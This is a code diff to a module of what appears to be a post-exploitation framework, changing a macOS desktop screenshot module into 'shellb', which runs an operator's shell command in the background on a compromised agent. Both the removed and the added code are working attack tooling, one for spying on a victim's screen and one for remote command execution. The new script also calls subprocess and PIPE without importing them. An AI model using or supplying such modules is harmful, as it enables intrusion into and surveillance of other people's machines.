@@ -1,9 +1,4 @@
-from zlib_wrapper import compress
-import os
-from lib.common import helpers
-import hashlib
-import base64
-
+import shlex
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -11,25 +6,25 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'NativeScreenshot',
+            'Name': 'shellb',
 
             # list of one or more authors for the module
             'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
+            'Description': ('execute a shell command in the background'),
 
             # True if the module needs to run in the background
-            'Background': False,
+            'Background' : True,
 
             # File extension to save the file as
-            'OutputExtension': "png",
+            'OutputExtension' : '',
 
             # if the module needs administrative privileges
-            'NeedsAdmin': False,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': True,
+            'OpsecSafe' : False,
 
             # the module language
             'Language' : 'python',
@@ -38,16 +33,22 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': []
+            'Comments': [ ]
         }
 
         # any options needed by the module, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent': {
+            'Agent' : {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to execute module on.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Command' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Command to execute.',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -68,25 +69,14 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-        script = """
-try:
-    import Quartz
-    import Quartz.CoreGraphics as CG
-    from AppKit import *
-    import binascii
-except ImportError:
-    print "Missing required module..."
+    def generate(self):
 
-onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
-desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
-imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
-rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
-props = NSDictionary()
-imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
-imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
-hexstring = binascii.hexlify(imageString)
-hex_data = hexstring.decode('hex')
-print hex_data
-"""
+        cmdstring = self.options['Command']['Value']
+        script = """
+import shlex
+arg = shlex.split("%s")
+p = subprocess.Popen(arg, stdout=PIPE)
+res = p.stdout.read()
+print res
+""" % (cmdstring)
         return script
